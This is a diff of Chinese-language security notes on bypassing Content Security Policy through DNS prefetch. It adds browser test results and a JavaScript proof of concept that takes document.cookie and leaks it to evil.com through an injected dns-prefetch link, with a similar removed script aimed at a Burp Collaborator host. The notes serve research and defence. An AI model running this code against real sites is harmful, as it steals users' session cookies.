@@ -86,8 +86,7 @@
 * 结论 - 不够严格的CSP 可被绕过实现数据泄露
 
 
-实验：在 https://jsbin.com 中粘贴以下代码进行测试 结果是chrome浏览器中 `<link rel="prefetch" href="//evil.com>` 可以bypass CSP
-
+实验：在 https://jsbin.com 中粘贴以下代码，进行测试
 ```
 <html>
 <head>
@@ -96,23 +95,50 @@
 </head>
 <body>
   <!-- DNS prefetching test -->
-<link rel="dns-prefetch" href="//dns-prefetch-href.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net">
-<link rel="dns-prefetch" src="//dns-prefetch-src.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net">
-<link rel="prefetch" href="//prefetch-href.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net">
-<link rel="prefetch" src="//prefetch-src.7rzhc3gtqfp5z03josziem99k0qqef.burpcollaborator.net"> 
+<link rel="dns-prefetch" href="//111dns-prefetch-href.evil.com">
+<link rel="dns-prefetch" src="//222dns-prefetch-src.evil.com">
+<link rel="prefetch" href="//333prefetch-href.evil.com">
+<link rel="prefetch" src="//444prefetch-src.evil.com"> 
 </body>
 </html>
 ```
 
-JavaScript PoC - 实测chrome下可利用XSS创建link标签 使用dns-prefetch机制发起DNS请求 绕过CSP获取数据
+测试结果: 
+
+在chrome浏览器(版本 79.0.3945.88)中 访问 `jsbin.com`(该网站设置了CSP)
 ```
-var willsend = document.cookie;//取全部(或部分)cookie 带分号空格的需要再处理
-var evildomain = "bcrstw1nx4bxok82kk9mlz24yv4msb.burpcollaborator.net";
-var body = document.getElementsByTagName('body')[0]; 
-// injecting the link tag in the HTML body to prefetch the domain
-body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + "cookieis-" + willsend + "." + evildomain +"\">";
+开发者模式 console中的内容如下:
+Refused to prefetch content from 'https://333prefetch-href.evil.com/' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'prefetch-src' was not explicitly set, so 'default-src' is used as a fallback.
+
+可知 第3种link标签会被jsbin.com设置的CSP阻止:   <link rel="prefetch" href="//333prefetch-href.evil.com">
 ```
 
+然而第1种link标签 `<link rel="dns-prefetch" href="//111dns-prefetch-href.evil.com">`能够"bypass" jsbin.com设置的CSP 向evil.com发送数据.
+
+`evil.com`成功接收到`jsbin.com`(该网站设置了CSP)发出的DNS请求的数据:
+```
+The Collaborator server received a DNS lookup of type A for the domain name :
+111dns-prefetch-href.evil.com
+```
+
+JavaScript PoC - 实测chrome浏览器(版本 79.0.3945.88)中 可利用`vul.com`(该网站设置了CSP)的存储型XSS漏洞，"绕过"其CSP 获取到cookie
+
+原理:构造以下代码并执行. 作用是创建link标签并添加到body dom解析该标签时 就会以dns-prefetch机制发出DNS请求(携带数据)到`evil.com`
+
+```
+var evildomain = "evil.com";
+l=document.createElement('link');
+document.body.appendChild(l);
+l.rel="dns-prefetch";
+var data1 = document.cookie.substring(1,2);//取全部或部分cookie 注意:如果data1字符串中带有分号空格等字符 需要处理以符合域名命名规范
+l.href = "//" + data1 + "." + evildomain;
+```
+
+`evil.com`成功接收到`vul.com`的数据:
+```
+The Collaborator server received a DNS lookup of type A for the domain name :
+g1.evil.com
+```
 
 #### 绕过CSP 方法2 - web应用设计问题导致策略注入
 
